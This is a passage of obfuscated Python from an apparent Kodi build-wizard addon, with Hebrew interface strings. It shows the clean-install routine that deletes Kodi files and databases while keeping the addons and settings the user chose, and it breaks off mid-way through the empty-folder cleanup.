			EXCLUDES .append ('plugin.video.metalliq')#line:5277
		if KEEPMOVIELIST =='true':#line:5278
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:5279
		if KEEPADDONS =='true':#line:5280
			EXCLUDES .append ('addons')#line:5281
		if KEEPTELEMEDIA =='true':#line:5282
			EXCLUDES .append ('plugin.video.telemedia')#line:5283
		EXCLUDES .append ('plugin.video.elementum')#line:5288
		EXCLUDES .append ('script.elementum.burst')#line:5289
		EXCLUDES .append ('script.elementum.burst-master')#line:5290
		EXCLUDES .append ('plugin.video.quasar')#line:5291
		EXCLUDES .append ('script.quasar.burst')#line:5292
		EXCLUDES .append ('skin.estuary')#line:5293
		if KEEPWHITELIST =='true':#line:5296
			O000O000OO0O0OO0O =''#line:5297
			O0OOOOO000O0O0OOO =wiz .whiteList ('read')#line:5298
			if len (O0OOOOO000O0O0OOO )>0 :#line:5299
				for OOOOO0OOO000OO00O in O0OOOOO000O0O0OOO :#line:5300
					try :O000OOOOO0O0O0000 ,O00O0O0O0OO00000O ,OO0O00O0O0OOOO0OO =OOOOO0OOO000OO00O #line:5301
					except :pass #line:5302
					if OO0O00O0O0OOOO0OO .startswith ('pvr'):O000O000OO0O0OO0O =O00O0O0O0OO00000O #line:5303
					OO0OO0O0OOO00O00O =dependsList (OO0O00O0O0OOOO0OO )#line:5304
					for O00OO000O0OO0O00O in OO0OO0O0OOO00O00O :#line:5305
						if not O00OO000O0OO0O00O in EXCLUDES :#line:5306
							EXCLUDES .append (O00OO000O0OO0O00O )#line:5307
						OOOO000OO00O0O000 =dependsList (O00OO000O0OO0O00O )#line:5308
						for O0OOO0O000OOO0OOO in OOOO000OO00O0O000 :#line:5309
							if not O0OOO0O000OOO0OOO in EXCLUDES :#line:5310
								EXCLUDES .append (O0OOO0O000OOO0OOO )#line:5311
					if not OO0O00O0O0OOOO0OO in EXCLUDES :#line:5312
						EXCLUDES .append (OO0O00O0O0OOOO0OO )#line:5313
				if not O000O000OO0O0OO0O =='':wiz .setS ('pvrclient',OO0O00O0O0OOOO0OO )#line:5314
		if wiz .getS ('pvrclient')=='':#line:5315
			for OOOOO0OOO000OO00O in EXCLUDES :#line:5316
				if OOOOO0OOO000OO00O .startswith ('pvr'):#line:5317
					wiz .setS ('pvrclient',OOOOO0OOO000OO00O )#line:5318
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:5319
		OO0O000O000O000OO =wiz .latestDB ('Addons')#line:5320
		for O00O00O0OOOOO0OOO ,OO0OO000O0O00O0OO ,OOOOO0OOOO00OO0OO in os .walk (OO0OO0OO00O00O0OO ,topdown =True ):#line:5321
			OO0OO000O0O00O0OO [:]=[OOOOOO00O00000OOO for OOOOOO00O00000OOO in OO0OO000O0O00O0OO if OOOOOO00O00000OOO not in EXCLUDES ]#line:5322
			for O000OOOOO0O0O0000 in OOOOO0OOOO00OO0OO :#line:5323
				OOO0OO0OOO00O0OOO +=1 #line:5324
				OO0O00O0O0OOOO0OO =O00O00O0OOOOO0OOO .replace ('/','\\').split ('\\')#line:5325
				O0O0O000OO000O000 =len (OO0O00O0O0OOOO0OO )-1 #line:5327
				if OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5328
				elif O000OOOOO0O0O0000 =='MyVideos99.db'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5329
				elif O000OOOOO0O0O0000 =='MyVideos107.db'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5330
				elif O000OOOOO0O0O0000 =='MyVideos116.db'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5331
				elif O000OOOOO0O0O0000 =='MyVideos99.db'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5332
				elif O000OOOOO0O0O0000 =='MyVideos107.db'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5333
				elif O000OOOOO0O0O0000 =='MyVideos116.db'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5334
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5335
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'skin.anonymous.mod'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5336
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'skin.Premium.mod'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5337
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'skin.anonymous.nox'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5338
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'skin.phenomenal'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5339
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'plugin.video.metalliq'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5340
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'skin.titan'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5342
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'pvr.iptvsimple'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5343
				elif O000OOOOO0O0O0000 =='sources.xml'and OO0O00O0O0OOOO0OO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5345
				elif O000OOOOO0O0O0000 =='quicknav.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5348
				elif O000OOOOO0O0O0000 =='x1101.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5349
				elif O000OOOOO0O0O0000 =='b-srtym-b.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5350
				elif O000OOOOO0O0O0000 =='x1102.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5351
				elif O000OOOOO0O0O0000 =='b-sdrvt-b.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5352
				elif O000OOOOO0O0O0000 =='x1112.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5353
				elif O000OOOOO0O0O0000 =='b-tlvvyzyh-b.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5354
				elif O000OOOOO0O0O0000 =='x1111.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5355
				elif O000OOOOO0O0O0000 =='b-tvknyshrly-b.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5356
				elif O000OOOOO0O0O0000 =='x1110.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5357
				elif O000OOOOO0O0O0000 =='b-yldym-b.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5358
				elif O000OOOOO0O0O0000 =='x1114.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5359
				elif O000OOOOO0O0O0000 =='b-mvzyqh-b.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5360
				elif O000OOOOO0O0O0000 =='mainmenu.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5361
				elif O000OOOOO0O0O0000 =='skin.Premium.mod.properties'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5362
				elif O000OOOOO0O0O0000 =='x1122.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5364
				elif O000OOOOO0O0O0000 =='b-spvrt-b.DATA.xml'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5365
				elif O000OOOOO0O0O0000 =='favourites.xml'and OO0O00O0O0OOOO0OO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5370
				elif O000OOOOO0O0O0000 =='guisettings.xml'and OO0O00O0O0OOOO0OO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5372
				elif O000OOOOO0O0O0000 =='profiles.xml'and OO0O00O0O0OOOO0OO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5373
				elif O000OOOOO0O0O0000 =='advancedsettings.xml'and OO0O00O0O0OOOO0OO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5374
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5375
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'program.apollo'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5376
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'plugin.video.allmoviesin'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPVICTORY =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5377
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'plugin.video.telemedia'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPTELEMEDIA =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5378
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'plugin.video.elementum'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5381
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'plugin.audio.soundcloud'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5383
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'weather.yahoo'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5384
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'plugin.video.quasar'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5385
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'program.apollo'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5386
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5387
				elif OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -2 ]=='userdata'and OO0O00O0O0OOOO0OO [O0O0O000OO000O000 -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OO0O00O0O0OOOO0OO [O0O0O000OO000O000 ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5388
				elif O000OOOOO0O0O0000 in LOGFILES :wiz .log ("Keep Log File: %s"%O000OOOOO0O0O0000 ,xbmc .LOGNOTICE )#line:5389
				elif O000OOOOO0O0O0000 .endswith ('.db'):#line:5390
					try :#line:5391
						if O000OOOOO0O0O0000 ==OO0O000O000O000OO and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O000OOOOO0O0O0000 ,KODIV ),xbmc .LOGNOTICE )#line:5392
						else :os .remove (os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ))#line:5393
					except Exception as OO0OO0O00000O0O00 :#line:5394
						if not O000OOOOO0O0O0000 .startswith ('Textures13'):#line:5395
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:5396
							wiz .log ("-> %s"%(str (OO0OO0O00000O0O00 )),xbmc .LOGNOTICE )#line:5397
							wiz .purgeDb (os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ))#line:5398
				else :#line:5399
					DP .update (int (wiz .percentage (OOO0OO0OOO00O0OOO ,O0O0O0O00OOO0O0O0 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000OOOOO0O0O0000 ),'')#line:5400
					try :os .remove (os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ))#line:5401
					except Exception as OO0OO0O00000O0O00 :#line:5402
						wiz .log ("Error removing %s"%os .path .join (O00O00O0OOOOO0OOO ,O000OOOOO0O0O0000 ),xbmc .LOGNOTICE )#line:5403
						wiz .log ("-> / %s"%(str (OO0OO0O00000O0O00 )),xbmc .LOGNOTICE )#line:5404
			if DP .iscanceled ():#line:5405
				DP .close ()#line:5406
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5407
				return False #line:5408
		for O00O00O0OOOOO0OOO ,OO0OO000O0O00O0OO ,OOOOO0OOOO00OO0OO in os .walk (OO0OO0OO00O00O0OO ,topdown =True ):#line:5409
			OO0OO000O0O00O0OO [:]=[O00OO0OO0OOOO0OOO for O00OO0OO0OOOO0OOO in OO0OO000O0O00O0OO if O00OO0OO0OOOO0OOO not in EXCLUDES ]#line:5410
			for O000OOOOO0O0O0000 in OO0OO000O0O00O0OO :#line:5411
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O000OOOOO0O0O0000 ),'')#line:5412
			  if O000OOOOO0O0O0000 not in ["Database","userdata","temp","addons","addon_data"]:#line:5413
			   if not (O000OOOOO0O0O0000 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:5414
			    if not (O000OOOOO0O0O0000 =='skin.titan'and KEEPSKIN3 =='true'):#line:5416
			      if not (O000OOOOO0O0O0000 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:5417
			       if not (O000OOOOO0O0O0000 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:5418
			        if not (O000OOOOO0O0O0000 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:5419
			         if not (O000OOOOO0O0O0000 =='program.apollo'and KEEPINFO =='true'):#line:5420
			          if not (O000OOOOO0O0O0000 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:5421
			           if not (O000OOOOO0O0O0000 =='weather.yahoo'and KEEPWEATHER =='true'):#line:5422
			            if not (O000OOOOO0O0O0000 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:5423
			             if not (O000OOOOO0O0O0000 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:5424
			              if not (O000OOOOO0O0O0000 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:5425
			               if not (O000OOOOO0O0O0000 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:5426
			                if not (O000OOOOO0O0O0000 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:5427
			                 if not (O000OOOOO0O0O0000 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:5428
			                  if not (O000OOOOO0O0O0000 =='plugin.video.neptune'and KEEPINFO =='true'):#line:5429
			                   if not (O000OOOOO0O0O0000 =='plugin.video.youtube'and KEEPINFO =='true'):#line:5430
			                    if not (O000OOOOO0O0O0000 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:5431
			                     if not (O000OOOOO0O0O0000 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:5432
			                      if not (O000OOOOO0O0O0000 =='plugin.video.allmoviesin'and KEEPVICTORY =='true'):#line:5433
			                       if not (O000OOOOO0O0O0000 =='plugin.video.telemedia'and KEEPTELEMEDIA =='true'):#line:5434
			                           if not (O000OOOOO0O0O0000 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:5438
			                            if not (O000OOOOO0O0O0000 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:5439
			                             if not (O000OOOOO0O0O0000 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:5440
			                              if not (O000OOOOO0O0O0000 =='plugin.video.quasar'and KEEPINFO =='true'):#line:5441
			                               if not (O000OOOOO0O0O0000 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:5442
